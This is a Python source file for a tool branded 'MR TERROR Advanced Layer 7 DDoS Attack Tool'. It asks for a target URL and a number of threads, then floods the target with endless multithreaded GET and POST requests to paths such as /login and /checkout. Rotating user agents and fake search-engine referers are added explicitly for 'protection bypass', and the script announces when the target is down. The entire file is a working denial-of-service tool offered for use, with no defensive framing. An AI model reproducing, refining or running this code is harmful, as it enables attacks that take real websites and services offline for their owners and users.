import requests
import threading
import random
import time
import os

# MR TERROR Logo
logo = """
_____        _____                       
|     |___   |_   _|___ ___ ___ ___ ___   
| | | |  _|    | | | -_|  _|  _| . |  _|  
|_|_|_|_|      |_| |___|_| |_| |___|_|    

        [ Created by MR TERROR ]
"""
os.system("clear")
print(logo)
print("\n🚀 MR TERROR Advanced Layer 7 DDoS Attack Tool 🚀\n")

# Live Monitor Variables
success_count = 0
failed_count = 0
target_down = False

# Custom User-Agents List
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

# Random Referers for Extra Protection Bypass
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
]

# Dynamic URL Path Generation Function
def random_url_path():
    paths = [
        "/login",
        "/register",
        "/admin",
        "/checkout",
        "/user/profile",
        "/dashboard",
        "/cart",
        "/post/product"
    ]
    return random.choice(paths)

# Simulated Browser Behavior
def simulated_browser_request(target, headers, method="GET", data=None):
    session = requests.Session()
    if method == "GET":
        return session.get(target, headers=headers, timeout=5)
    elif method == "POST":
        return session.post(target, headers=headers, data=data, timeout=5)

# Layer 7 Enhanced HTTP Flood Attack Function
def layer_7_attack(target):
    global success_count, failed_count, target_down
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "PHPSESSID=samplecookie123; security=high;"
    }
    while True:
        try:
            # Randomized URL Path
            target_url = target + random_url_path()
            # Simulate GET and POST requests
            method = random.choice(['GET', 'POST'])
            data = {"username": "testuser", "password": "password123"}
            
            # Simulating Browser Request (GET/POST)
            response = simulated_browser_request(target_url, headers, method, data if method == 'POST' else None)
            
            if response.status_code == 200:
                success_count += 1
                print(f"✅ HTTP Sent: {success_count} | ❌ Failed: {failed_count}")
            else:
                failed_count += 1

        except requests.exceptions.RequestException as e:
            failed_count += 1
            print(f"❌ Request Failed! Total Failed: {failed_count}")
            
        # Check if Target is Down
        if failed_count >= 50:
            print("🚨 RED ALERT: Target is Down! Stopping Attack!")
            target_down = True
            break

# Start Attack with Multiple Threads
def start_attack(target, threads):
    print(f"⚡ Attacking {target} with {threads} threads ⚡")

    for i in range(threads):
        threading.Thread(target=layer_7_attack, args=(target,)).start()

# Get User Input
target = input("🔗 Enter Target URL (e.g., http://example.com): ")
thread_count = int(input("🔥 Enter Number of Threads (e.g., 500): "))

# Start Attack
start_attack(target, thread_count)
